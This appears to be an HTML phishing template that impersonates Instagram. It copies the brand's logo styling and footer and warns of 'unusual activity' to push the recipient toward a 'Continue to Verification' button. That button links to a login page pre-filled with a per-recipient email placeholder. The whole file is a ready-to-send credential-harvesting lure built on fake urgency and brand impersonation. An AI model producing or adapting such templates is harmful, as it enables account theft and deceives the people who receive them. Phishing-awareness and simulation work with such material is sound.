<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background: #ffffff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 
                0 10px 25px rgba(0,0,0,0.08),
                0 20px 60px rgba(0,0,0,0.12);
        }
        

        .logo {
            font-size: 28px;
            font-weight: bold;
            background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
            -webkit-background-clip: text;
            color: transparent;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 22px;
            color: #262626;
            margin-bottom: 10px;
        }

        p {
            font-size: 14px;
            color: #666;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .btn {
            display: inline-block;
            width: 100%;
            padding: 12px;
            background: #0095f6;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 15px;
            transition: 0.2s;
        }

        .btn:hover {
            background: #1877f2;
        }

        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #999;
        }

        .footer span {
            margin: 0 8px;
            cursor: pointer;
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }
        }
    </style>
</head>

<body>

    <div class="container">

        <div class="logo">Instagram</div>

        <h1>Security Check Required</h1>

        <p>
            We detected unusual activity on your account.  
            To continue using Instagram, please confirm your identity.
        </p>

        <a href="/login?email={{ recipient_email }}" class="btn">
            Continue to Verification
        </a>

        <div class="footer">
            © Instagram <span>•</span> Help <span>•</span> Privacy <span>•</span> Terms
        </div>

    </div>

</body>
</html>
